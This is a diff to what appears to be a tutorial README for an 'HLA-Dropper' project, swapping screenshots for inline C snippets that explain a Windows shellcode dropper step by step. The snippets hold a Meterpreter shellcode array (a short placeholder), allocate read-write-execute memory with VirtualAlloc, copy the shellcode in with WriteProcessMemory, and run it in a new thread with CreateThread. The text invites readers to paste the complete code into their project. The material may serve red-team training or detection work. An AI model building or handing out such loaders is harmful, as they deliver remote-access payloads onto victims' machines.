@@ -54,27 +54,39 @@ DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
 ```
 
 Within the main function, the variable **code** is defined, which is responsible for storing the meterpreter shellcode. The content of "code" is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.
-<p align="center">
-<img width="608" alt="image" src="https://user-images.githubusercontent.com/50073731/235367184-71a8dbb0-036b-4cc1-93d2-28ef1abfd9ef.png">
-</p>    
+```
+// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
+    unsigned char code[] = "\xfc\x48\x83";
+```
     
 The next code block defines the function pointer **void***, which points to the variable **exec** and stores the return address of the allocated memory using the Windows API VirtualAlloc.
-<p align="center">
-<img width="594" alt="image" src="https://user-images.githubusercontent.com/50073731/235367335-a08a4a78-8a5c-4e02-9523-7bf2d1032f1c.png">
-</p>
+```
+// Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
+    // 'exec' will hold the base address of the allocated memory region
+    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+```
 
 The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.<p align="center">
-<img width="611" alt="image" src="https://user-images.githubusercontent.com/50073731/235367362-359adc26-500b-4b9d-8d3b-a8aa32dd2b64.png">
-</p>
+```
+// Copy the shellcode into the allocated memory region using WriteProcessMemory
+    SIZE_T bytesWritten;
+    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
+```
 
 Next, the Windows API **CreateThread** is used to execute the meterpreter shellcode. This is done by creating a new thread.<p align="center">
-<img width="615" alt="image" src="https://user-images.githubusercontent.com/50073731/235367381-48be952c-9d46-4859-8682-69ed717f4dd4.png">
-</p>
+```
+// Create a new thread to execute the shellcode
+    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
+    // The returned handle of the created thread is stored in hThread
+    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); 
+```
 
 And by using the Windows API **WaitForSingleObject** we need to make sure that the shellcode thread completes its execution before the main thread exits.
-<p align="center">
-<img width="616" alt="image" src="https://user-images.githubusercontent.com/50073731/235367403-8bd2150f-eeb2-444c-b7ca-bf4c7ea39260.png">
-</p>
+```
+// Wait for the shellcode execution thread to finish executing
+    // This ensures the main thread doesn't exit before the shellcode has finished running
+    WaitForSingleObject(hThread, INFINITE);    
+```
 
 Here is the complete code, and you can copy and paste this code into your HLA-Dropper project in Visual Studio.
 
